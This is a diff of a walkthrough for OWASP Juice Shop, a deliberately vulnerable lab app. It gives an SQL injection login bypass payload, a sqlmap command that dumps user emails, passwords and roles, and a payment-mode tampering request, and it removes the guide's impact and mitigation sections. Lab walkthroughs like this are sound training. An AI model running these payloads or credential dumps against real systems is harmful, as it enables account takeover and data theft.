@@ -11,7 +11,6 @@
 
 - [Overview](#overview)
 - [Vulnerability Description](#vulnerability-description)
-- [Real-World Impact](#real-world-impact)
 - [Challenge 1.1 – Login as Jim](#challenge-11--login-as-jim)
   - [Reconnaissance](#reconnaissance)
   - [Walkthrough – Manual (Burp Suite)](#walkthrough--manual-burp-suite)
@@ -63,19 +62,10 @@ The `--` comments out the rest of the query. Since `1=1` is always true, the fir
 jim@juice-sh.op'--
 ```
 
----
-
-## Real-World Impact
-
-SQL Injection has been consistently ranked in the **OWASP Top 10** for decades. A successful SQLi attack can result in:
-
-- **Authentication bypass** — log in as any user without a password
-- **Full database exfiltration** — read all tables, including credentials, PII, payment data
-- **Data manipulation or deletion** — modify or destroy records
-- **Privilege escalation** — access admin functionality
-- **Remote Code Execution** — in certain database configurations (e.g. `xp_cmdshell` in MSSQL)
-
-Notable real-world breaches caused by SQLi include the **Heartland Payment Systems breach (2008)** affecting over 130 million card numbers, and countless others across e-commerce, healthcare, and government systems.
+Into:
+```sql
+SELECT * FROM Users WHERE email = 'jim@juice-sh.op' --' AND password = 'input'
+```
 
 ---
 
@@ -83,12 +73,12 @@ Notable real-world breaches caused by SQLi include the **Heartland Payment Syste
 
 ### Reconnaissance
 
-Jim's email address can be discovered through the Juice Shop's product reviews, which are visible without authentication. Navigate to any product and inspect the reviews — Jim has left a review with his full email address `jim@juice-sh.op` visible in the response.
+Jim's email address can be discovered through the Juice Shop's product reviews, which are visible without authentication. Navigate to any product and inspect the reviews — Jim has left a review with his full email address `jim@juice-sh.op` visible in the response. In our case Jim has written a feedback for the 'Green Smoothie'.
 
 Alternatively, intercept the product API response in Burp Suite:
 
 ```
-GET /rest/products/search?q= HTTP/1.1
+GET /rest/products/22/reviews HTTP/1.1
 Host: localhost:4000
 ```
 
@@ -160,30 +150,66 @@ POST /rest/user/login HTTP/1.1
 Host: localhost:4000
 Content-Type: application/json
 
-{"email":"test@test.com","password":"test"}
+{"email":"jim@juice-sh.op","password":"test1234"}
 ```
 
 **Step 2 – Run sqlmap**
 
+**Linux / macOS:**
 ```bash
-sqlmap -r login-request.txt \
-  --dbms=sqlite \
-  --level=3 \
+sqlmap -r login_request.txt \
+  -p email \
+  --flush-session \
   --ignore-code=401,500 \
+  --technique=B \
+  --level=3 \
+  --risk=2 \
+  --threads=10 \
   --batch \
-  --dump
+  --dump \
+  -T Users \
+  -C "id,email,password,role,username" \
+  --where="email LIKE '%jim%'" \
+  2>&1
+```
+
+**Windows (PowerShell):**
+```powershell
+sqlmap -r login_request.txt `
+  -p email `
+  --flush-session `
+  --ignore-code=401,500 `
+  --technique=B `
+  --level=3 `
+  --risk=2 `
+  --threads=10 `
+  --batch `
+  --dump `
+  -T Users `
+  -C "id,email,password,role,username" `
+  --where="email LIKE '%jim%'" `
+  2>&1
 ```
 
 Key flags explained:
 
 | Flag | Purpose |
 |------|---------|
-| `-r login-request.txt` | Use saved Burp request as input |
-| `--dbms=sqlite` | Tell sqlmap the backend is SQLite |
-| `--level=3` | Required to detect JSON POST body injection points |
-| `--ignore-code=401,500` | Ignore HTTP error codes that would otherwise abort |
-| `--batch` | Non-interactive mode, accept all defaults |
-| `--dump` | Dump the database contents |
+| `-r login_request.txt` | Read the HTTP request from a Burp-exported file instead of specifying a URL directly |
+| `-p email` | Explicitly target the `email` field in the JSON body for injection |
+| `--flush-session` | Clear cached session data from previous runs to ensure a clean start |
+| `--ignore-code=401,500` | Do not abort when Juice Shop returns 401/500 — these are expected responses |
+| `--technique=B` | Boolean-based blind injection only — skips other techniques to save time |
+| `--level=3` | Required minimum to detect injection points inside JSON POST body parameters |
+| `--risk=2` | Allows more aggressive payloads while avoiding data-modifying queries |
+| `--threads=10` | 10 parallel requests — significantly speeds up boolean-blind bit-by-bit extraction |
+| `--batch` | Non-interactive mode — all prompts are answered with defaults automatically |
+| `--dump` | Extract and display the contents of the target table |
+| `-T Users` | Target only the `Users` table |
+| `-C "id,email,password,role,username"` | Specify columns explicitly — required because SQLite has no `information_schema` |
+| `--where="email LIKE '%jim%'"` | SQL filter to extract only Jim's record, reducing extraction time drastically |
+| `2>&1` | Redirect stderr to stdout so errors and output appear together in the terminal |
+
 
 **Step 3 – Results**
 
@@ -221,7 +247,7 @@ Host: localhost:4000
 Authorization: Bearer <jim's token>
 Content-Type: application/json
 
-{"paymentMode":"card"}
+{"paymentMode":"wallet"}
 ```
 
 **Step 3 – Modify the payment mode**
@@ -248,17 +274,6 @@ The server responds with:
 ```
 
 Jim now has Deluxe Membership without any payment being processed.
-
----
-
-## Mitigation
-
-| Vulnerability | Recommended Fix |
-|--------------|----------------|
-| SQL Injection | Use **parameterized queries** / prepared statements — never concatenate user input into SQL strings |
-| SQLi in JSON body | Ensure ORM/query layer treats all input fields as parameters, not raw SQL |
-| Missing server-side payment validation | Validate payment completion server-side before granting membership; never trust client-supplied payment status |
-| Exposed user data in API responses | Filter API responses to return only the minimum necessary data; never expose email addresses in public endpoints |
 
 ---
 
